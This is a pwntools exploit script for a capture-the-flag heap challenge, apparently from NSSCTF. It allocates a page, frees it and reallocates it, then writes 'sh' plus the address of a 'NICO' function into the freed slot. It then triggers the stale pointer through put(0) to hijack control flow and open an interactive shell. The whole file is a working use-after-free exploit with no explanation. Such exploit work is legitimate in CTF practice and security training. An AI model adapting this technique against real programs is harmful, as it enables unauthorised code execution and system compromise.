#!/usr/bin/python3
# -*- coding: UTF-8 -*-

from pwn import *
from LibcSearcher import *

local = 1
os_level = 32
binary_name = 'pwn'
remote_addr, port = 'node4.anna.nssctf.cn:28516'.split(':')

if local:
    p = process('./' + binary_name)
    elf = ELF('./' + binary_name)
    # libc = e.libc
else:
    p = remote(remote_addr, port)
    elf = ELF('./' + binary_name)
    # libc = ELF('libc-2.23.so')

if os_level == 64:
    context(log_level='debug', os='linux', arch='amd64', bits=64)
elif os_level == 32:
    context(log_level='debug', os='linux', arch='i386', bits=32)
else:
    print('Error os!!!')
    exit()
context.terminal = ['/usr/bin/x-terminal-emulator', '-e']

ru = lambda x: p.recvuntil(x)
rc = lambda x: p.recv(x)
rl = lambda: p.recvline()
sl = lambda x: p.sendline(x)
sd = lambda x: p.send(x)
sda = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
show = lambda x:log.success(x)
slp = lambda x:sleep(x)

def dbg():
    if local:
        gdb.attach(p)
        pause()
    else:
        pass

def add():
    sla(':',str(1))

def edit(idx:int,content='a'):
    sla(':',str(2))
    sla('page\n',str(idx))
    sla('strings\n',content)

def put(idx:int):
    sla(':',str(4))
    sla('page\n',str(idx))

def delete(idx:int):
    sla(':',str(3))
    sla('page\n',str(idx))

#Main function
if __name__ == '__main__':
    #you can add your code here
    noic = p32(elf.sym['NICO'])
    add()#init page
    delete(0)
    add()
    edit(1,b'sh\x00\x00' + noic)
    dbg()
    put(0)
    p.interactive()
